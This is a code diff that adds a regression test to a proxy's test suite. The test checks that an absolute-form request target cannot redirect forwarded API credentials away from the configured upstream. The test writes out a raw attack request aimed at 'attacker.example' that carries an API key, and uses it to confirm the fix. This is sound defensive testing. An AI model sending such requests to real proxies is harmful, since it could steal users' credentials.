@@ -466,3 +466,69 @@ export async function runProxyTests() {
     await rm(tempRoot, { recursive: true, force: true });
   }
 }
+
+// ─── Regression: absolute-form request target must not escape upstream ───
+// An attacker could send "POST http://attacker.example/v1/messages" as the
+// request target. Before the fix, new URL(req.url, upstreamBase) would parse
+// the absolute URL and forward credentials to the attacker's host. After the
+// fix, the proxy constructs the URL from pathname+search only, ignoring any
+// host in the request target. Credentials go to the configured upstream.
+{
+  let proxy;
+  let configuredUpstreamHit = false;
+  const configuredUpstream = http.createServer((req, res) => {
+    configuredUpstreamHit = true;
+    res.writeHead(200, { "content-type": "application/json" });
+    res.end("{}");
+  });
+
+  try {
+    const upstreamPort = await listen(configuredUpstream);
+    proxy = await startProxy({
+      port: 0,
+      upstreams: { anthropic: `http://127.0.0.1:${upstreamPort}`, openai: "https://api.openai.com" },
+      logPath: join(await mkdtemp(join(tmpdir(), "sigrank-proxy-")), "sessions.jsonl"),
+    });
+
+    // Send a raw HTTP request with an absolute-form target pointing at a
+    // different host. fetch() can't do this — it always uses origin-form.
+    const res = await new Promise((resolve, reject) => {
+      const req = http.request(
+        {
+          host: "127.0.0.1",
+          port: proxy.port,
+          method: "POST",
+          path: "http://attacker.example/v1/messages",
+          headers: {
+            "content-type": "application/json",
+            "x-api-key": "sk-ant-leaked",
+            host: "attacker.example",
+          },
+        },
+        (upstreamRes) => {
+          const chunks = [];
+          upstreamRes.on("data", (c) => chunks.push(c));
+          upstreamRes.on("end", () =>
+            resolve({ status: upstreamRes.statusCode, body: Buffer.concat(chunks).toString() }),
+          );
+        },
+      );
+      req.on("error", reject);
+      req.end(JSON.stringify({ model: "claude-3", messages: [] }));
+    });
+
+    // The request should reach the CONFIGURED upstream (loopback), proving
+    // the absolute-form host was ignored. Credentials were NOT sent to
+    // attacker.example — they went to the configured upstream only.
+    assert.strictEqual(
+      configuredUpstreamHit,
+      true,
+      "proxy must forward to the configured upstream, not the absolute-form host",
+    );
+
+    console.log("✓ proxy: absolute-form request target ignored, credentials sent to configured upstream only");
+  } finally {
+    if (proxy) await proxy.close().catch(() => {});
+    if (configuredUpstream.listening) await closeServer(configuredUpstream).catch(() => {});
+  }
+}
